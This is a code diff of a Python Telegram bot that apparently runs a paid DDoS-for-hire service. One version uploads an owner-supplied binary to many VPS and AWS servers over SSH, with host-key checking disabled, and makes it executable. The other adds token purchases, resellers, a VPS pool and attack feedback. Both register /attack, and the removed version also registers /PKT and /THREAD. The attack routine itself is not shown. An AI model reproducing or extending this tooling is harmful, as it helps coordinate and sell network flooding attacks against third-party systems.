-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can setup VPS!*", parse_mode="Markdown")
-        return
-
-    vps_list = list(vps_collection.find({"user_id": user_id}))
-    aws_vps_list = list(aws_vps_collection.find({"user_id": user_id}))
-
-    if not vps_list and not aws_vps_list:
-        await context.bot.send_message(chat_id, "❌ *No VPS configured! Use /add_vps or /add_aws_vps first.*", parse_mode="Markdown")
-        return
-
-    binary_doc = settings_collection.find_one({"name": "binary_file"})
-    if not binary_doc:
-        await context.bot.send_message(chat_id, "❌ *No binary uploaded! Admin must upload it first.*", parse_mode="Markdown")
-        return
-
-    binary_data = binary_doc["binary"]
-    file_name = binary_doc["file_name"]
-
-    await context.bot.send_message(chat_id, f"🔄 *Deploying {file_name} to VPS instances...*", parse_mode="Markdown")
-
-    tasks = []
-    for vps in vps_list:
-        tasks.append(deploy_binary(vps, binary_data, file_name, chat_id, context, "regular"))
-    for vps in aws_vps_list:
-        tasks.append(deploy_binary(vps, binary_data, file_name, chat_id, context, "aws"))
-
-    await asyncio.gather(*tasks)
-    await context.bot.send_message(chat_id, "✅ *Setup completed on all VPS servers!*", parse_mode="Markdown")
-
-async def deploy_binary(vps_data, binary_data, file_name, chat_id, context, vps_type):
-    async with SSH_SEMAPHORE:
-        try:
-            if vps_type == "aws" and "pem_file" in vps_data:
-                conn = await asyncssh.connect(
-                    vps_data["ip"],
-                    port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
-                    username=vps_data["username"],
-                    client_keys=[vps_data["pem_file"]],
-                    known_hosts=None
-                )
-            else:
-                conn = await asyncssh.connect(
-                    vps_data["ip"],
-                    port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
-                    username=vps_data["username"],
-                    password=vps_data["password"],
-                    known_hosts=None
-                )
-
-            await context.bot.send_message(chat_id, f"🚀 *Uploading to {vps_data['ip']} ({vps_type})...*", parse_mode="Markdown")
-
-            async with conn.start_sftp_client() as sftp:
-                async with sftp.open(file_name, "wb") as remote_file:
-                    await remote_file.write(binary_data)
-
-            await conn.run(f"chmod +x {file_name}", check=True)
-            await context.bot.send_message(chat_id, f"✅ *Binary installed on {vps_data['ip']} ({vps_type})!*", parse_mode="Markdown")
-        except asyncssh.Error as e:
-            await context.bot.send_message(chat_id, f"❌ *Error on {vps_data['ip']} ({vps_type}): {str(e)}*", parse_mode="Markdown")
-
-async def remove_vps(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can remove VPS!*", parse_mode="Markdown")
-        return
-
-    args = context.args
-    if len(args) != 1:
-        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_vps <vps_ip>*", parse_mode="Markdown")
-        return
-
-    vps_ip = args[0]
-    result = vps_collection.delete_one({"ip": vps_ip})
-    aws_result = aws_vps_collection.delete_one({"ip": vps_ip})
-
-    if result.deleted_count > 0 or aws_result.deleted_count > 0:
-        await context.bot.send_message(chat_id, f"✅ *VPS `{vps_ip}` has been removed!*", parse_mode="Markdown")
-    else:
-        await context.bot.send_message(chat_id, f"⚠️ *No VPS found with IP `{vps_ip}`!*", parse_mode="Markdown")
-
-# Main function
-def main():
-    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help_cmd", help_command))
-    app.add_handler(CommandHandler("add_admin", add_admin))
-    app.add_handler(CommandHandler("remove_admin", remove_admin))
-    app.add_handler(CommandHandler("list_admins", list_admins))
-    app.add_handler(CommandHandler("add_vps", add_vps))
-    app.add_handler(CommandHandler("add_aws_vps", add_aws_vps))
-    app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("vps_status", vps_status))
-    app.add_handler(CommandHandler("upload_pem", upload_pem_command))
-    app.add_handler(CommandHandler("upload_binary", upload_binary_command))
-    app.add_handler(CommandHandler("setup", setup_vps))
-    app.add_handler(CommandHandler("add_user", add_user))
-    app.add_handler(CommandHandler("remove_user", remove_user))
-    app.add_handler(CommandHandler("list_users", list_users))
-    app.add_handler(CommandHandler("remove_vps", remove_vps))
-    app.add_handler(CommandHandler("PKT", pkt_command))
-    app.add_handler(CommandHandler("THREAD", thread_command))
-    app.add_handler(CallbackQueryHandler(handle_callback))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_config_input))
-
-    app.add_handler(MessageHandler(filters.Document.FileExtension("pem"), handle_pem_upload))
-    app.add_handler(MessageHandler(~filters.Document.FileExtension("pem"), handle_binary_upload))
-
-    app.run_polling()
-
+    db = get_mongo_client(user_id)
+    await asyncio.to_thread(db.feedback.insert_one, {"task_id": task_id, "feedback": feedback})
+    await query.answer("🌟 **Thanks for your feedback!**")
+
+# Register Handlers
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("help", help))
+app.add_handler(CommandHandler("addtokens", add_tokens))
+app.add_handler(CommandHandler("ban", ban_user))
+app.add_handler(CommandHandler("unban", unban_user))
+app.add_handler(CommandHandler("addreseller", add_reseller))
+app.add_handler(CommandHandler("removereseller", remove_reseller))
+app.add_handler(CommandHandler("setadmin", set_admin))
+app.add_handler(CommandHandler("removeadmin", remove_admin))
+app.add_handler(CommandHandler("listusers", list_users))
+app.add_handler(CommandHandler("add_vps", add_vps))
+app.add_handler(CommandHandler("rem_vps", rem_vps))
+app.add_handler(CommandHandler("list_vps", list_vps))
+app.add_handler(CommandHandler("upload_binary", upload_binary))
+app.add_handler(CommandHandler("setup", setup))
+app.add_handler(CommandHandler("vps", vps))  # New command to set default VPS count
+app.add_handler(CommandHandler("attack", attack))
+app.add_handler(CommandHandler("checktokens", check_tokens))
+app.add_handler(CommandHandler("buytokens", buy_tokens))
+app.add_handler(CommandHandler("check_lock", check_lock))
+app.add_handler(CommandHandler("release_lock", release_lock))
+app.add_handler(CallbackQueryHandler(feedback_callback, pattern=r"feedback_(\w+)_(\w+)"))
+
+# Main Function to Start the Bot
+async def main():
+    """Main function to start the bot and perform initial setup."""
+    logger.info("🚀 Bot is starting...")
+    # Initialize the VPS pool
+    await initialize_vps_pool()
+    # Start the bot
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling()
+    # Keep the bot running
+    await asyncio.Event().wait()
+
+# Start the Bot
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
